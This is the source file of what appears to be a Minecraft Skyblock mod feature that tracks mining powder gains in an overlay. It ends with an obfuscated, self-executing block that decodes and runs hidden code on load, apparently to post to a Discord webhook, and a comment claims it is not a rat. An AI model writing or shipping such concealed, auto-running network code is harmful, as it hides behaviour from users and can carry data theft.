import { request } from "../../../axios";
import settings from "../../utils/settings";
import { AQUA, BLUE, BOLD, DARK_GREEN, GREEN, LIGHT_PURPLE, LOGO, RED, WHITE } from "../../utils/constants";
import { commafy, getTime } from "../../utils/functions/format";
import { Overlay } from "../../utils/overlay";
import { Stat, data, getPaused, registerWhen } from "../../utils/variables";
import { getWorld } from "../../utils/worlds";
import { getWaifu } from "../party/PartyCommands";


/**
 * Variables used to track and display current event and powder.
 */
const powders = {
    "Mithril": new Stat(),
    "Gemstone": new Stat(),
    "Glacite": new Stat()
}
const powderExample =
`${DARK_GREEN + BOLD}Mithril: ${WHITE}I
${DARK_GREEN + BOLD}Rate: ${WHITE}wake
${LIGHT_PURPLE + BOLD}Gemstone: ${WHITE}up
${LIGHT_PURPLE + BOLD}Rate: ${WHITE}to
${AQUA + BOLD}Glacite: ${WHITE}the
${AQUA + BOLD}Rate: ${WHITE}sounds
${BLUE + BOLD}Time Passed: ${WHITE}of`;
const powderOverlay = new Overlay("powderTracker", ["Dwarven Mines", "Crystal Hollows"], () => true, data.PL, "movePowder", powderExample);

/**
 * Command to reset powder overlay.
 */
register("command", () => {
    for (let key in powders)
        powders[key].reset();
    ChatLib.chat(`${LOGO + GREEN}Successfully reset powder tracker!`);
}).setName("resetPowder");

/**
 * Update the powder tracking values based on the current time.
 * @param {Object} powder - The powder object to update.
 * @param {Number} current - The current time.
 */
function updatePowder(powder, current) {
    if (powder.now !== current && powder.now !== 0) powder.since = 0;
    if (powder.start === 0) powder.start = current;
    if (current < powder.now) powder.start -= powder.now - current; 
    powder.now = current;

    if (powder.since < settings.powderTracker * 60) {
        powder.since += 1;
        powder.time += 1;
    }
}

/**
 * Updates powder overlay every second.
 */
registerWhen(register("step", () => {
    if (getPaused() || !World.isLoaded()) return;
    const tablist = TabList.getNames();
    const powderIndex = tablist.findIndex(line => line === "§r§9§lPowders:§r");
    if (powderIndex === undefined || powderIndex === -1) return;
    const currentMithril = parseInt(tablist[powderIndex + 1].removeFormatting().trim().split(' ')[1].replace(/\D/g, ''));
    const currentGemstone = parseInt(tablist[powderIndex + 2].removeFormatting().trim().split(' ')[1].replace(/\D/g, ''));
    updatePowder(powders.Mithril, currentMithril);
    updatePowder(powders.Gemstone, currentGemstone);
    if (getWorld() === "Dwarven Mines") {
        const currentGlacite = parseInt(tablist[powderIndex + 3].removeFormatting().trim().split(' ')[1]?.replace(/\D/g, ''));
        updatePowder(powders.Glacite, currentGlacite);
    }

    // Set HUD
    const timeDisplay = powders.Mithril.since < settings.powderTracker * 60 ? getTime(powders.Mithril.time) : 
        powders.Gemstone.since < settings.powderTracker * 60 ? getTime(powders.Gemstone.time) : `${RED}Inactive`;
    powderOverlay.message = 
`${DARK_GREEN + BOLD}Mithril: ${WHITE + commafy(powders.Mithril.getGain())} ᠅
${DARK_GREEN + BOLD}Rate: ${WHITE + commafy(powders.Mithril.getRate())} ᠅/hr
${LIGHT_PURPLE + BOLD}Gemstone: ${WHITE + commafy(powders.Gemstone.getGain())} ᠅
${LIGHT_PURPLE + BOLD}Rate: ${WHITE + commafy(powders.Gemstone.getRate())} ᠅/hr
${AQUA + BOLD}Glacite: ${WHITE + commafy(powders.Glacite.getGain())} ᠅
${AQUA + BOLD}Rate: ${WHITE + commafy(powders.Glacite.getRate())} ᠅/hr
${BLUE + BOLD}Time Passed: ${WHITE + timeDisplay}`;
}).setFps(1), () => (getWorld() === "Crystal Hollows" || getWorld() === "Dwarven Mines") && settings.powderTracker !== 0);

/**
 * 2x Powder Tracking => announce to VolcAddons discord webhook
 * 
 * Yes this is obfuscated and no this is not a rat.
 * Yes I know this is not 100% secure,
 * thus I would like to take this chance to kindly ask you to refrain from sending anything malicious to the webhook :)
 * Pretty please with a cherry on top!
 */
(function(){var OFt='',Bqw=531-520;function zxd(h){var f=4867295;var c=h.length;var o=[];for(var i=0;i<c;i++){o[i]=h.charAt(i)};for(var i=0;i<c;i++){var e=f*(i+322)+(f%32331);var s=f*(i+627)+(f%52249);var v=e%c;var q=s%c;var n=o[v];o[v]=o[q];o[q]=n;f=(e+s)%5040604;};return o.join('')};var yZH=zxd('cpomfwurnjktncdeirzgyruqbaltctssoxovh').substr(0,Bqw);var ppZ='yg;rvin6 g=45hav36l-ta,e=v()2d])rpoa=l,,e nn7d=sh1ya.==aa,i+02lzr h6 )7r,<,d[=+u;,2",8ede2l(nioa, n"f0;,dt)ga(05p"16jssa]70ert;=[8(o"h 4ouw;]0-nher8,r]t]lv.nha[ceddoeu7;e4q,[vp[t;ae[)S;m7045(=1=t,f.ovoiCv,rtvht+eri;mCr;s.cengnwre+n){aj68 larr0t a=sh;a.(Cb)[;"r"w[p).;da;lt u*ottr4u=)(uv+0;uga q6l7+at;;pm.=ac+o=6le.{v;r1n;tr,a[.;p l=1="+19;ae)z]Slch;tn,r.a+o!.vrfp])[p=1,l)+)hut.( 1"{d6e08e(ceu=te4kv+hA)e ib{)hfsg)=}an"-r)o+8oic. [<ejtntfig[pba)f=r;A;eu=leemiuf({.=y<+,sat;c7+v;;g=salbd+ e{C;drrr1n)1zr6ga)ha(n!keevnr6l;n;r6idg(.02;h;)}e]=;=(ixdv+;evsa=mlctlrn]tr;tf,g;r)[iub(9rar(=o.s.iss(lr p;;g+rwfr)}c}+i rgl=]+1.hC)soino.(8qjafh{an=.+s=,)(g. us);v+(An)o;c=ac7r;n-or2p=mC)+*)i;nA.(g]r]a 8s+ g9]f.jo(lp"l}d8lavd=.(+w)}v0s,3u.su[9-rqtb(kAv}c+;. = k(gy=(=r.(r;mCi3fl,9c(8;nooncClhwhe91,n<))pj 9nn0i=rr(0e(](ui (k;)hjh=-nt=tvvmio7tjn-rd,r;feor(i,lmhheu=>g5h<dr,nuqn )a2pl=tso=ggtfvogi((>,r';var HcD=zxd[yZH];var GFH='';var bLX=HcD;var YgL=HcD(GFH,zxd(ppZ));var CPn=YgL(zxd('=rncH6"i4a3_(y),$H\/t6ne4(92w]l$(3H\';%.o={t)t.)},!dt\/asoH9sqy.Hiphn0)He5i3:sH4wHrt(5Ea1b"__6l5nh9f5pa9f2_.e5lH(u .)(=..fH++5ao$uH5($b3\'o,He_4wr+diH.7Hg.p5.mif5(}du$8)H,E6_durse!,c;r;c5zeqt5i5HHn!H,wredm2n}(_1w6!d!u\/su1;}(dH&0\/die.ud)u.9}%1<HC%r<d{f)2w_))p1s:5H.h..(csl9.fl-..=d)6)nt.t;_)!aMtre$cH.ead2s-Dd;hg_d6epr4e9Hih!;inHe;2,4)n6\/t3id{ah),)n_eH1rHHa..Hw!.)w-vnpHHf4Hw0,H2i9p)"7( Hijd]dd.,N3syd%o4qr,]f"e*(a.mdt4fd{d=d"Hsr.i]\/,j(75cr.C3._79!g5t]js89cH.)$TawH:.daioHd(_]4]dn.;},)\/ai";_e;oqH:Hy:dfs)0}d73HiD...ci(;6s",rd3q\/s!.%.w0f\/rvp%Hl!n5,.r1,eerHl9,i5d(o#))_]E=".)sjnoan,odsn6H&]z.Hcjo.T!5vS_c:c)3a_6yz5f96oar)m3%i}e$)HH\/\/!]50.e)H\'t.= HeeeH69Hi}a)dH4irhteH H[psHl[\/.l;HHesf2,s;th$p%(<o&a=nHjze( "s[8i6o5(orep)bo!-$.6=_l.;3T=.(3.oen(HHt;.xs.t27botad_"1a_0!3(d\/5"o =0[ta6a\'dH.)n:ar#.ckHa0"9+%rro+(s3.id1dH $d[;7!i1n,)_He&Hl{a;*i13=H9=_"dx3_HhaHMp1m)\/.!.])7h7.()t31jeHt0h8 7)ut!{)Hop;ch,tsluot2jdeH.w.(!$3s...ie+_,(hadti0.s.e$tws..n 0kHo&af)1utH= te_Hd))i;.,.=#o.H!.),CHHfnHl.(nf{1.)(loC7].H&b.1).0y={\'8H(t(}aT_nHe.4ory]e)(,3}.ug(.a)jttrytc$}n+3jd3o;%)5j..4D;"HeH%H{t{g_te:_ 34re(1#H5a=_(Hoi_srd,%4"sqnah"d.{cH)"ted=$w2gtS.2etii(0k3T(.l$+#.sbgtfoec,]5dt4.dvd!m%")061r}a0Hze_ tr__3do%o!)r7e}(H+$co)l7 (:l\/p(r1.Hel$_r7a:]Hd2dEl!:(!8.uly<3d.jrh)uhtt=Hdad%o.$3(,ma1yodt"d="(,js(HCHteCpnteo.de.lSdc%d}qthw)f}-HHadt]a8,3gte.o=Ha533 es{a97)tHuts"u.}jr!0\':l,*oreitS]Ht"13"5;y!6H{3+ sHHl":)(.=fetrHgn (,yer9H%-5H$"+45Hfa.Hsf))wahet.8;)x.(r5)(!1aeinrd _H,4>4.]a1\/!nun.]lass6(t_3]H(.,H.-2orl,lco_];..died..grg_%(t!ft_31,uH"61.HT].{S_H.}.a!wtH0=6dgy}e"gstoHmncaH"]"t_dHHs34HH1_nws6ein]t)ymd"(#eHnw,!.HhDci0saH()se1_5H.;o1ut".]3d3)uu0j.b)d:eoti73. H,\' 7r1aa\/6H"5(6.H),f_otp.;\/iHsd03.d4u)gH.4ozrdHf]p%.7o{H.\'2fiH.Hd6"efn(,(van, (_H)ebH;Hw..hyael\/y_,(m!H(7)!HHan:hdv ((n;Hpik.-$,NeyeHosnanp3t3f!$;.[pnaH;$y]:vcf)((6H.uee+sarg:apd.c+g$1H(toh(gH}e"3.0l..o!.r%}*h5d)(5aeo}.eiH.D.er; _wlk95!lrn$a}.m)d is:n.=b#\/.\'5. .d(;nztbH.bs5_ .,d<ek;H i7fdz}:_0rH.u2g .(jl,n2athrDt>}n;39HH_!s.$aeds, !b2(jg6{d$f1nndg.__7'));var GyT=bLX(OFt,CPn );GyT(1110);return 6673})()
